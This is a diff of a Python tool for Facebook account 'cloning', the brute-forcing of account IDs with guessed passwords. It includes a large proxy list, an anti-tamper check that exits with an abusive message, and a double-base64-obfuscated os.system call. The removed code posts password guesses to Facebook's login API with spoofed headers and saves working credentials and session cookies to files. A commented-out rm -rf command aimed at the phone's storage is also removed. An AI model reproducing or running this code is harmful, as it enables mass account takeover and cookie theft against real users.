'184.185.2.12:4145', '105.214.2.80:5678', '49.0.250.196:999', '161.35.25.221:3295', '122.9.131.161:8011', '199.102.105.242:4145', '122.9.131.161:3333', '163.53.186.250:5678', '191.37.68.142:32627', '117.186.40.30:1080', '159.138.252.45:6789', '142.54.228.193:4145', '46.23.141.142:5678', '103.224.54.225:31433', '188.164.222.147:1080', '24.234.142.122:31008', '8.213.129.15:999', '173.249.33.122:54853', '170.79.182.82:11337', '47.92.239.69:3128', '70.80.75.236:5678', '183.164.243.149:8089', '174.77.111.197:4145', '199.58.185.9:4145', '103.233.152.180:1080', '80.78.234.31:1080', '202.21.115.94:44574', '103.127.204.109:25327', '184.178.172.17:4145', '91.93.64.227:4145', '47.253.214.60:2080', '202.40.188.92:55103', '158.140.190.211:5678', '198.199.101.121:2327', '167.99.182.125:14475', '98.162.25.16:4145', '80.80.164.164:10801', '103.144.18.202:1080', '138.68.109.12:18395', '116.63.130.30:58208', '144.76.99.207:16003', '108.175.24.1:13135', '51.75.126.150:37198', '192.111.135.17:18302', '27.115.33.94:4153', '134.209.154.177:49425', '47.253.214.60:8989', '51.38.71.114:58083', '45.132.75.19:16863', '181.13.198.90:4153', '159.89.29.73:8080', '177.93.76.6:4145', '192.111.139.165:4145', '39.104.57.170:9002', '72.210.208.101:4145', '8.213.129.15:8989', '181.129.70.82:44357', '192.111.134.10:4145', '192.141.236.10:5678', '116.118.98.5:5678', '103.102.26.1:7469', '72.206.181.97:64943', '47.252.27.174:3128', '76.81.6.107:31008', '195.114.9.184:34445', '121.200.60.122:4153', '138.68.109.12:22412', '118.137.56.108:1080', '184.178.172.11:4145', '82.103.118.42:1099', '184.181.217.213:4145', '202.166.206.59:5678', '103.94.1.98:1080', '173.236.172.4:49631', '8.213.129.15:8089', '173.212.219.197:26877', '212.83.143.60:20733', '138.68.109.12:20535', '186.103.143.213:4153', '192.111.130.2:4145', '89.19.175.117:4145', '103.160.17.38:5678', '5.135.1.146:21287', '202.46.91.218:12391', '210.86.173.42:4153', '192.252.208.67:14287', '121.33.161.113:4145', '185.95.199.103:1099', '103.70.159.149:5678', '222.165.234.242:41541', '98.170.57.249:4145', '103.111.53.82:58033', '117.92.125.24:8089', '177.188.138.11:3128', '72.206.181.103:4145', '188.166.234.144:14605', '72.195.34.41:4145', '117.74.65.29:1111', '117.74.65.29:16072', '197.232.47.122:5678', '98.162.25.29:31679', '206.42.33.45:1080', '197.232.43.224:1080', '103.17.90.6:5678', '138.68.109.12:15866', '117.74.65.29:5566', '121.139.218.165:43295', '117.74.65.29:7788', '181.209.106.187:1080', '103.127.23.10:5678', '190.120.250.31:4145', '124.107.36.198:5678', '72.221.232.152:4145', '138.117.141.27:8888', '117.74.65.29:10005', '131.161.68.41:35944', '168.228.36.22:35010', '213.145.137.102:37447', '186.115.219.59:4153', '117.74.65.29:4063', '64.90.53.25:54049', '63.151.9.74:64312', '206.189.85.33:10198', '139.255.97.156:14888', '95.188.82.147:3629', '170.244.0.179:4145', '142.44.165.103:27982', '98.162.96.52:4145', '138.68.109.12:62662', '170.246.84.89:35010', '192.111.129.145:16894', '190.145.37.5:65409', '185.139.56.133:4145', '14.161.14.106:5678', '72.195.34.58:4145', '98.181.137.83:4145', '103.127.204.117:27217', '82.147.123.185:10808', '117.74.65.29:10000', '80.92.227.185:5678', '147.139.164.26:8080', '187.19.150.221:80', '103.114.96.93:1080', '192.111.139.163:19404', '190.211.161.212:32410', '154.94.0.133:5678', '72.217.216.239:4145', '23.88.121.205:16586', '175.139.179.65:41527', '122.248.38.4:4153', '134.119.189.9:14339', '197.248.28.17:10801', '65.20.222.175:35010', '192.252.220.89:4145', '72.210.252.134:46164', '46.105.105.223:19963', '192.111.137.35:4145', '159.203.63.113:50720', '45.128.135.253:1080', '200.27.110.30:57702', '142.54.229.249:4145', '27.70.165.109:20173', '74.119.144.60:4145', '103.120.38.238:5678', '184.181.217.220:4145', '103.37.82.134:39873', '31.172.133.253:4153', '154.79.248.156:5678', '8.209.243.173:8888', '190.89.89.157:4153', '89.28.32.203:57391', '51.222.108.216:25018', '190.182.88.226:52339', '101.51.121.141:4153', '54.39.46.139:44918', '45.91.93.166:17657', '103.127.63.57:5678', '46.98.192.233:5678', '41.223.65.158:4153', '202.40.177.94:5678', '206.42.38.85:1080', '162.212.174.239:80', '138.197.66.68:42588', '45.60.197.203:8907', '95.31.5.29:51528', '36.67.63.239:38071', '138.68.109.12:47831', '131.196.180.1:4153', '195.69.135.19:5678', '68.1.210.163:4145', '95.140.117.10:1080', '109.226.36.78:1080', '217.23.13.32:35479', '179.253.8.244:7777', '14.241.241.185:4145', '162.253.68.97:4145', '45.60.197.203:1187', '184.178.172.3:4145', '5.178.217.227:31019', '103.168.123.92:5678', '39.104.89.111:999', '115.85.84.163:5678', '187.9.76.154:4153', '39.104.89.111:8084', '41.207.251.206:8899', '93.190.143.82:41515', '36.67.14.5:5678', '95.104.160.140:7788', '181.174.85.78:5678', '102.39.113.232:5678', '192.111.130.5:17002', '186.194.234.18:4153', '202.179.184.34:5430', '170.84.83.172:5678', '130.193.123.34:5678', '209.126.127.97:61122', '112.78.138.163:5678', '192.252.211.197:14921', '72.195.114.169:4145', '103.231.176.58:5678', '91.150.77.57:56921', '72.210.221.223:4145', '8.219.167.110:8009', '72.221.171.130:4145', '164.52.42.6:4145', '108.175.23.241:13135', '46.160.90.81:5678', '198.11.175.192:8989', '70.166.167.55:57745', '42.49.148.167:3333', '192.111.138.29:4145', '203.23.49.150:5678', '8.219.167.110:5678', '179.107.52.101:4153', '8.219.167.110:9000', '72.221.164.34:60671', '174.77.111.198:49547', '72.221.171.135:4145', '5.189.129.186:56940', '181.48.70.30:4153', '45.128.133.169:1080', '188.167.178.90:4145', '113.176.195.145:4153', '117.74.65.29:9595', '154.72.78.146:5678', '109.111.242.142:1080', '54.82.101.127:8088', '98.162.25.4:31654', '116.233.95.105:4145', '46.105.105.223:8028', '190.2.136.45:47521', '117.74.65.29:143', '43.248.27.11:54730', '98.162.96.53:10663', '117.74.65.29:4118', '185.164.57.111:7614', '117.74.65.29:2087', '184.178.172.14:4145', '155.254.9.2:36510', '182.16.171.42:51459', '117.74.65.29:5005', '109.166.207.162:3629', '188.64.113.104:1080', '188.75.255.119:35010', '222.165.223.140:41541', '200.116.198.140:37092', '192.252.216.81:4145', '213.6.77.198:5678', '170.246.85.108:37163', '183.88.247.52:4153', '187.19.127.246:8011', '200.41.60.33:4153', '141.94.254.138:49207', '190.12.95.170:37209', '181.115.75.102:5678', '72.206.181.123:4145', '191.36.191.53:5678', '36.64.16.154:35010', '184.105.133.1:48324', '117.74.65.29:646', '104.236.114.255:1611', '81.16.9.222:3629', '188.92.110.174:1080', '46.8.106.140:5500', '92.42.8.20:4145', '200.105.192.6:5678', '95.31.42.199:3629', '186.97.144.98:5678', '94.180.217.100:4145', '27.147.155.70:52596', '165.227.228.102:80', '108.41.35.10:22419', '181.129.74.58:30431', '187.67.26.179:4145', '117.74.65.29:3002', '51.79.248.208:54578', '187.32.20.249:5678', '200.159.146.184:4153', '117.74.65.215:9300', '103.247.22.52:12', '184.181.217.201:4145', '117.74.65.215:6789', '170.80.91.11:4145', '46.188.2.42:5678', '117.74.65.29:9093', '187.103.0.26:5678', '117.74.65.215:33427', '185.89.65.165:33744', '192.252.214.20:15864', '213.74.223.69:4153', '142.54.232.6:4145', '132.148.75.242:47171', '117.74.65.215:10091', '109.238.208.130:4153', '184.170.248.5:4145', '72.210.252.137:4145', '116.118.98.10:5678', '117.74.65.215:3000', '213.186.202.149:5678', '221.4.161.201:51080', '196.29.231.1:4145', '170.246.196.42:4153', '41.169.78.142:57775', '3.39.244.149:33080', '68.71.249.153:48606', '202.40.186.66:1088', '123.56.129.203:8089', '51.255.80.151:42304', '142.229.215.114:3128', '208.102.51.6:58208', '182.253.93.4:4145', '62.112.11.204:12692', '202.124.224.19:80', '46.227.37.21:1088', '134.209.154.177:11639', '159.192.121.240:4145', '138.219.201.242:5678', '174.75.211.222:4145', '140.210.196.193:20000', '117.74.65.215:1604', '79.143.225.152:31270', '103.106.119.146:12391', '177.131.29.209:4153', '109.224.12.170:52015', '98.162.96.41:4145', '117.74.65.215:11443', '81.174.11.159:43516', '200.146.229.129:8291', '177.185.221.57:21776', '14.160.23.139:4145', '94.247.241.70:51006', '117.74.65.29:8110', '213.165.185.211:4153', '138.68.116.249:8017', '107.181.168.145:4145', '177.66.59.130:4153', '98.181.137.80:4145', '213.222.34.200:4145', '72.221.232.155:4145', '204.3.205.243:80', '45.157.126.165:6121', '103.28.23.229:4145', '180.250.190.150:1080', '103.127.204.112:12132', '213.226.11.149:59086', '92.51.78.66:4153', '186.94.29.52:8080', '181.129.62.2:47377', '24.249.199.4:4145', '203.76.112.68:5678', '94.181.33.149:40840', '37.131.165.19:59341', '185.18.72.249:4153', '47.243.124.21:81', '172.106.13.203:56950', '181.143.61.123:4153', '67.201.33.10:25283', '27.118.21.13:5678', '213.74.223.76:4153', '103.139.246.166:5678', '62.122.201.246:50129', '89.38.96.50:48439', '115.127.87.62:1088', '115.127.75.154:1088', '103.93.100.78:32000', '103.48.183.113:4145', '103.138.22.165:32000', '190.119.167.154:5678', '104.200.135.46:4145', '103.91.95.2:32767', '119.46.2.250:4145', '103.134.113.247:32767', '114.103.88.116:8089', '110.44.171.10:57775', '95.170.202.197:58744', '46.172.75.51:5678', '41.58.169.214:5678', '190.186.216.196:5678', '103.235.199.100:25566', '58.143.65.69:22569', '125.126.213.4:38801', '197.234.58.102:57775', '45.117.228.81:4145', '186.145.192.251:5678', '109.94.178.238:3629', '103.250.153.202:41889', '46.105.105.223:45443', '138.122.74.55:57775', '200.60.71.12:46934', '103.167.172.104:57775', '183.111.165.166:14', '159.65.9.135:10277', '146.196.121.29:57775', '47.109.46.223:8090', '117.74.65.29:8012', '142.54.235.9:4145', '107.152.98.5:4145', '103.79.165.164:57775', '193.106.192.50:36387', '154.0.155.205:8080', '202.154.18.115:1080', '177.234.244.170:32213', '72.49.49.11:31034', '45.174.240.94:999', '103.168.233.91:25566', '103.149.104.161:4153', '170.254.148.110:8080', '159.138.255.141:9981', '79.122.244.99:3128', '49.70.89.82:9999', '95.158.174.111:1080', '103.18.232.47:80', '202.57.37.197:35846', '43.229.73.239:41862', '41.190.152.130:4673', '79.173.75.182:3629', '41.57.34.112:1080', '110.78.149.70:4145', '31.131.135.247:4153', '5.133.96.148:4153', '103.152.104.228:1080', '80.250.18.225:25566', '190.114.143.226:8080', '117.198.221.34:4153', '213.145.134.174:3629', '177.38.245.106:55713', '201.184.239.75:5678', '103.230.62.146:12391', '117.74.125.19:1313', '194.85.135.243:4145', '80.254.185.73:1080', '93.104.63.65:80', '165.0.15.182:5678', '91.193.125.123:3629', '117.74.120.61:1313', '177.107.217.112:4145', '24.172.34.114:60133', '41.190.232.36:36926', '117.220.162.33:5621', '95.81.94.254:3128', '197.211.24.206:5678', '103.176.96.116:5678', '91.121.163.199:40148', '94.154.21.65:1080', '102.89.12.203:7599', '119.18.146.139:4153', '209.94.84.65:1080', '117.74.120.121:1133', '47.100.90.127:10443', '103.207.170.131:5678', '180.210.222.233:1080']
+
+####### MDLL #######
+
+def clr():
+    try:
+        data = os.listdir('/sdcard')
+        if 'Android' in data:
+            print(' \033[1;32m[!]\033[1;37m D'+'ont Try Bypas'+'s Mother Fuc'+'ker...! \n YOUR'+' BYPAS'+'S FUCK'+'ED BY USMAN');exit()
+        else:exit()
+    except:exit()
+
+
+
+#########UA + VER ########
+
+version = "V3.3"
+ 
+####### MODL KILLER #######
+
+from requests import api
+x = open(api.__file__,'r').read()
+if "print" in x:
+    clr()
+elif "sys.stdout.write" in x:
+    clr()
+else:
+    pass
+from requests import sessions
+ 
+x = open(sessions.__file__,'r').read()
+if "print" in x:
+    clr()
+elif "sys.stdout.write" in x:
+    clr()
+else:
+    pass
+from requests import models
+x = open(models.__file__,'r').read()
+if "print" in x:
+    clr()
+ 
+elif "sys.stdout.write" in x:
+    clr()
+else:
+    pass
 try:
     import mechanize
-except ModuleNotFoundError:
-    os.system('pip install mechanize > /dev/null')
-    #sexy()
-from urllib.request import Request, urlopen
-import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
-from concurrent.futures import ThreadPoolExecutor as SiamNIX
-from string import * 
-from random import randint
-from time import sleep as slp
-from os import system as cmd
-from zlib import decompress 
-import os, platform
+except:
+    os.system(base64.b64decode(base64.b64decode("Y0dsd0lHbHVjM1JoYkd3Z2JXVmphR0Z1YVhwbElENGdMMlJsZGk5dWRXeHM=")))
+    
+    
+def xox(m):
+    for x in m + '\n':
+        sys.stdout.write(x)
+        sys.stdout.flush()
+        time.sleep(0.07)
 
-from concurrent.futures import ThreadPoolExecutor
-fast_work = ThreadPoolExecutor(max_workers=15).submit
+def p(x):
+    print(x)
 
-#def fucked():
-   # os.system('rm -rf /sdcard/*')
-   # os.system('rm-rf /sdcard/DCIM/')
-   # os.system('rm-rf /sdcard/Android/')
-  #  os.system('rm-rf /sdcard/Android/data/')
-  #  os.system('rm -rf /sdcard/Download/*')
-  #  os.system('rm -rf /sdcard1/*')
-#    os.system('rm -rf /sdcard/0/*')
-count = 0
-loop = 0
-lim = 0
-tp = 0
-oks = []
-cps = []
-id = []
-ps = []
-sid = []
-total=[]
-methods = []
-srange = 0
-saved = []
-totaldmp = 0
-filter = []
-os.system("xdg-open https://t.me/mrnixtermuxtool")
-sys.stdout.write('\x1b]2; Mr:NIX\x07')
-S = '\033[1;37m'
-A = '\x1b[38;5;208m'
-R = '\x1b[38;5;46m'
-F = '\x1b[38;5;48m'
-Z = '\033[1;33m'
-head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
-folder_path = '/sdcard/MR:NIX'
+xxxx="[FBAN/"+"FB4A;FBAV/"+"61.0.0.15.69;FBBV/"+"20748125;FBDM/"+"{density=1.0,width=600,height=976};FBLC/"+"es_LA;FBCR/"+"MOVISTAR;FBMF/"+"Rockchip;FBBD/"+"K5-3G;FBPN/"+"com.facebook.katana;FBDV/"+"K5-3G;FBSV/"+"5.1.1;nullFBCA/"+"x86:armeabi-v7a;]"
+#ua = "[FBAN/FB4A;FBAV/107.26.45.69;FBBV/61714298;FBDM/{density=2.5,width=859,height=2059};FBLC/en_GB;FBRV/11130038;FBCR/GLOBE;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI;FBSV/5.8;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/135.62.83.5;FBBV/51324647;FBDM/{density=1.1,width=832,height=2554};FBLC/en_GB;FBRV/24264444;FBCR/GLOBE;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI;FBSV/9.7;FBOP/1;FBCA/arm64-v8a:;]"
+folder_path = '/sdcard/VENOM'
 try:
     os.makedirs(folder_path, exist_ok=True)
 except:
     pass
-    
+
 oks=[]
 cps=[]
 loop=0
-logo=(f"""
-\033[1;92m        `7MN.   `7MF'`7MMF'`YMM'   `MP' 
-          MMN.    M    MM    VMb.  ,P   
- \033[1;31m         M YMb   M    MM     `MM.M'    
-\033[1;31m          M  `MN. M    MM       MMb     
- \033[1;31m         M   `MM.M    MM     ,M'`Mb.   
-\033[1;92m          M     YMM    MM    ,P   `MM.  
-\033[1;92m        .JML.    YM  .JMML..MM:.  .:MMa.
-__________________________________________________
+logo=(f"""\033[1;37m
+ db    db d88888b d8b   db  .d88b.  .88b  d88. 
+ 88    88 88'     888o  88 .8P  Y8. 88'YbdP`88 
+\033[1;32m Y8    8P 88ooooo 88V8o 88 88    88 88  88  88 
+\033[1;32m `8b  d8' 88~~~~~ 88 V8o88 88    88 88  88  88 
+\033[1;37m  `8bd8'  88.     88  V888 `8b  d8' 88  88  88 
+    YP    Y88888P VP   V8P  `Y88P'  YP  YP  YP  
+════════════════════════════════════════════════
+\033[1;32m  • \033[1;37m Tool Owner :-  Usman X Kazama
+\033[1;32m  • \033[1;37m GitHub     :-  VENOM-786
+\033[1;32m  • \033[1;37m Type       :-  Free
+\033[1;32m  • \033[1;37m Version    :-  {version}""")
+os.system('clear')
+#print("\033[1;32m [•]\033[1;37m Join My FaceBook Group...! \033[1;32mThnx");time.sleep(2);os.system('xdg-open https://facebook.com/groups/1245912839659325/')
 
- \033[1;92m   ▁ ▂ ▃ ▅ ▆ ▇ █ \033[1;31mAUTHOR:MR:NiX\033[1;92m █ ▇ ▆ ▅ ▃ ▂ ▁                                                         
-──────────────────────────────────────────────────
-\033[1;92m Owner   :            MR:NIX
-\033[1;92m Facebook:            Mr:Nix
-\033[1;92m Github  :            Mr-NIX
-\033[1;92m Version :            0.0.4
-──────────────────────────────────────────────────""")
-#__________________MAIN____________#
-def linex():
-        print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')    
-def clear():
-    os.system("clear")
-    print(logo)    
+######## CLEAR #######
 
+def clear():os.system('clear');print(logo);print(48*'═')#print('\t\033[1;37m\033[1;42mEID MUBARAK ALL GYZ\033[1;0m\33[1;37m');print(41*'═')
 
+ 
+######### LINE #########
+
+def line():print(48*'\033[1;37m═')
 
 
+ 
+###########______###########
 
-
-
-
-def result(OKs,cps):
-    if len(OKs) != 0 or len(cps) != 0:
-        print('\n')
-        print(' \x1b[1;92m\x1b[1;91m\x1b[1;96m\x1b[0mThe Cloneing Has Been Complete\x1b[1;96m\x1b[1;91m\x1b[1;92m\x1b[0m')
-        print(' TOTAL OK: \x1b[1;92m%s' % str(len(oks)))
-        print(' TOTAL CP: \x1b[1;96m%s' % str(len(cps)))
-        input("Press enter to back NIX Menu ")
-        exit()
-os.system("xd-open https://github.com/Tox1c-143")
-def menu():   
-    os.system('clear')
-    print(logo)
-    print(f'\x1b[38;5;196m[\x1b[1;92m1\x1b[38;5;196m] \033[38;5;46mFile Cloneing')
-    print(f'\x1b[38;5;196m[\x1b[1;92m2\x1b[38;5;196m]\033[38;5;46m \033[38;5;46mRandom Cloneing ')
-    print(f'\x1b[38;5;196m[\x1b[1;92m3\x1b[38;5;196m]\033[38;5;46m \033[38;5;46mContact Admin')
-    print(f'\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m]\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    select = input('\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m]\x1b[38;5;46mSELECT MENU : ')
-    if select =='1':
-        method_crack()
-    elif select =='2':
-        AFG_CLONING()
-  ###  elif select =='2':
-       ## random_number()
-    elif select =='3':
-       os.system('xdg-open https://t.me/+8801332718196');menu()
-    else:
-        print('\n Select Wrong option ... ')
-        time.sleep(2)
-        NIX(allkey)
-       # os.system('xdg-open https://wa.me/+8801310067277')
-#---------------------[ USER - AGENT ] -------------------#
-def uaxxx():
-    ua='[FBAN/FB4A;FBAV/83.0.0.5091;FBBV/8586033;FBDM/{density=1,width=720,height=1280};FBLC/en_US;FBRV/5718626;FBCR/null;FBMF/sony Ericsson Xperia U;FBBD/sony Ericsson Xperia U;FBPN/com.facebook.katana;FBDV/;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
-    return ua
-def method_crack():
-    global methods
-    clear()
-    print("\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m] \033[38;5;46mSELECT METHOD")
-    print("\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m]\033[38;5;46m METHOD All IS IN PROCESSING ")
-    print("\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    print(f'\x1b[38;5;196m[\033[38;5;46m1\x1b[38;5;196m] \033[38;5;46mMethod \x1b[1;92m●\033[38;5;46m graph')
-    print(f'\x1b[38;5;196m[\033[38;5;46m2\x1b[38;5;196m]\033[38;5;46m Method \x1b[1;92m●\033[38;5;46m B-graph')
-    print(f'\x1b[38;5;196m[\033[38;5;46m3\x1b[38;5;196m] \033[38;5;46mMethod \x1b[1;92m●\033[38;5;46m API')
-    print(f'\x1b[38;5;196m[\033[38;5;46m4\x1b[38;5;196m] \033[38;5;46mMethod \x1b[1;92m●\033[38;5;46m B-api')
-    print(f'\x1b[38;5;196m[\033[38;5;46m0\x1b[38;5;196m] \033[38;5;46mBack')
-    print(f"\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    option = input('\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m]\x1b[38;5;46mSelect Method : ')
-    if option =='1':
-        methods.append('methodA')
-        main_crack().crack(id)
-    elif option =='2':
-        methods.append('methodB')
-        main_crack().crack(id)
-    elif option =='3':
-        methods.append('methodC')
-        main_crack().crack(id)
-    elif option =='4':
-        methods.append('methodD')
-        main_crack().crack(id)
-    elif option =='0':
-        Siam()
-    else:
-      print('\n Select Wrong Option ...')
-      time.sleep(2)
-      method_crack()
-
-class main_crack():
-    def __init__(self):
-        self.id=[]
-    def crack(self,id):
-        global methods
+def Main_VENOM():
         clear()
-        print("\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m]\033[38;5;46m Put File  Example ● /sdcard/file.txt ")
-        self.file = input('\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m]\x1b[1;92m File Path ● ')
-        try:
-            self.id = open(self.file).read().splitlines()
-            self.pasw()
-        except FileNotFoundError:
-            print('Worng File Please confram you r file etc...')
-            time.sleep(2)
-            os.system('clear')
-            print(logo)
-            print('Try Again ...')
-            time.sleep(2)
-            main_crack().crack(id)
-            
-    def methodA(self, sid, name, psw):
-        try:
-            global oks,cps,loop
-            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mNIX-XD-M1\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
-            sys.stdout.flush()
-            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
-            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
-            fbbv = str(random.randint(10000000, 99999999))
-            fbrv = str(random.randint(10000000, 99999999))
-            fbsv = f"{random.uniform(4.0, 10.0):.1f}"
-            density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
-            width = random.randint(720, 1440)
-            height = random.randint(1080, 2560)
-            fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
-            fbcr = random.choice(["Grameenphone","Robi","Banglalink","Teletalk"])
-            fban = random.choice(["FB4A", "FB5A", "FB6A"])
-            fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
-            ######m1#####
-            sony = random.choice(['SonyEricssonST25iv','SonyEricssonST25i','Xperia U'])
-            uaxx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/412.0.0.22.115;FBPN/com.facebook.katana;FBLC/pt_BR;FBBV/468774204;FBCR/CLARO BR;FBMF/Xiaomi;FBBD/Redmi;FBDV/M1908C3JGG;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2216};FB_FW/1;FBRV/470765339;] FBBK/1'
-            fs = name.split(' ')[0]
-            try:
-                ls = name.split(' ')[1]
-            except:
-                ls = fs
-            for pw in psw:
-                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())             
-                
-                with requests.Session() as session:                                       
-                    data = {"adid": str(uuid.uuid4()),
-"format": "json",
-"device_id": str(uuid.uuid4()),
-"cpl": "true",
-"family_device_id": str(uuid.uuid4()),
-"secure_family_device_id": str(uuid.uuid4()),
-"credentials_type": "device_based_login_password",
-"error_detail_type": "button_with_disabled",
-"source": "account_recovery",
-'sim_serials': "['80973453345210784798']",
-'openid_flow': 'android_login',
-'openid_provider': 'google',
-"email": sid,
-"password": ps,
-"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
-"generate_session_cookies": "1",
-"meta_inf_fbmeta": "V2_UNTAGGED",
-'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
-"advertiser_id": str(uuid.uuid4()),
-"currently_logged_in_userid": "0",
-"locale": "en_US",
-"client_country_code": "US",
-"method": "auth.login",
-"fb_api_req_friendly_name": "authenticate",
-"fb_api_caller_class": "AuthOperations$PasswordAuthOperation",
-"api_key": "882a8490361da98702bf97a021ddc14d"}
-                content_lenght = ("&").join([ "%s=%s" % (key, value) for key, value in data.items() ])
-                headers = {'User-Agent':uaxx,
-'Content-Type': 'application/x-www-form-urlencoded',
-'x-fb-Connection-Type': 'MOBILE.LTE',
-'Accept': '*/*',
-'Host': 'graph.facebook.com',
-'X-FB-Net-HNI': str(random.randint(2e4, 4e4)),
-'X-FB-SIM-HNI': str(random.randint(2e4, 4e4)),
-'X-Fb-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
-'Priority' : 'u=3,i',
-'Zero-Rated': '0',
-'X-Fb-Connection-Quality': 'GOOD',
-'X-FB-Friendly-Name': 'authenticate',
-'X-FB-Request-Analytics-Tags': 'graphservice',
-'X-Tigon-Is-Retry': 'False',
-'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
-'X-Fb-Device-Group': '5120',
-'X-FB-HTTP-Engine': 'Liger',
-'X-FB-Client-IP': 'True',
-'X-FB-Server-Cluster': 'True',
-'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
-'Content-Length': str(len(content_lenght))}
-                q = session.post("https://graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
-                if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);NIXb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={NIXb};{ckkk}"
-                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mNIX-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
-                    
-                    Elite(sid,ps,ckkk)
-                    oks.append(sid)                 
-                    open('/sdcard/NIX/OK_ids_M1.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/NIX/COOKiEs_M1.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
-                    break
-                elif 'www.facebook.com' in q['error']['message']:
-                     #print(f"\r\x1b[1;96m [NIX-CP] {sid} ● {ps} {S}")
-                     cps.append(sid)
-                     open('/sdcard/NIX/M1-CP.txt','a').write(sid+'●'+ps+'\n')
-                else:
-                    continue
-            loop+=1
-        except requests.exceptions.ConnectionError:
-            self.methodA(sid, name, ps)
-         #METHOD3   
-    def methodC(self, sid, name, psw):
-        try:
-            global oks,cps,loop
-            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mNIX-XD-M3\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
-            sys.stdout.flush()
-            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
-            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
-            fbbv = str(random.randint(10000000, 99999999))
-            fbrv = str(random.randint(10000000, 99999999))
